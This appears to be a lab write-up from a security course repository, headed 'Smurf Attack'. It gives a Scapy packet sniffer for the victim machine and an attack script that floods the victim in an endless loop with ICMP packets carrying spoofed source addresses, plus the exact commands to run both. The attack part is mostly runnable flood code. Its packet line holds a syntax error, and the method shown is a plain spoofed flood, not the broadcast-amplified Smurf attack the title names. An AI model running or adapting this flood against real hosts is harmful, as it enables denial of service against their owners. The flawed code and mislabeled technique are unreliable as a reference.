# Smurf Attack

Lab Environment :

Victim Ip : 10.11.137.43
Attacker Ip: 10.11.130.60

Victim Machine

We have to create a victim.py file in victim Machine 

```
#!/usr/bin/env python3

import signal
import sys

if len(sys.argv) != 2:
  print("sudo {} <pcap file name to save>".format(sys.argv[0]))
  sys.exit(1)

pktfilename = sys.argv[1]

try:
  from scapy.all import *
except ImportError:
  import os
  os.system("pip install scapy==2.5.0 matplotlib==3.8.2 pyx==0.16 vpython==7.6.4 cryptography==42.0.2")
  sys.exit(1)


def abrt_sig_hndler(sig, frame):
  print(sig)
  print(frame)
  print("Pressed Ctrl C")
  pkts = sniffer.stop()
  # pkts.summary()
  wrpcap(pktfilename, pkts, append=True)
  sys.exit(0)

signal.signal(signal.SIGINT, abrt_sig_hndler)

sniffer = AsyncSniffer()
sniffer.start()
sniffer.join()
```

after saving this code. Run this code

`sudo python3 victim.py victim_pcap.pcap`

![image](https://github.com/jayshah17/Implementation-of-Cyber-Security-Lab/assets/76842630/eeba9c88-dbaf-4158-b931-111727616abe)

Attacker Machine 

We have to create attack.py file in attacker

```
#!/usr/bin/env python

import sys

from scapy.all import *

def send_packet(srcIP, dstIP, count):
  p = IP(src=srcIP, dst=dstIP) / ICMP() "This is Attacker"
  return send(p, count=count)

if __name__ == "__main__":
  if len(sys.argv) < 3:
    print(f"sudo {sys.argv[0]} <victim IP> <random IPs for source seperated by SPACE>")
    sys.exit(1)
  dstIP = sys.argv[1]
  srcIPs = sys.argv[2:]
  while True:
    for srcIP in srcIPs:
      send_packet(srcIP, dstIP, 100)

```

after saving this code in attacker machine 
Run this code.

`sudo python3 attack.py "10.11.137.43" "10.11.137.48" "10.11.137.49" "10.11.137.42" "10.11.137.5"`

![image](https://github.com/jayshah17/Implementation-of-Cyber-Security-Lab/assets/76842630/94022886-536e-4246-8277-4216427bd255)

We can view in Wireshark that pcap file 

![image](https://github.com/jayshah17/Implementation-of-Cyber-Security-Lab/assets/76842630/da932e86-fc54-4af2-995e-2d576d5e72bc)

![Uploading image.png…]()


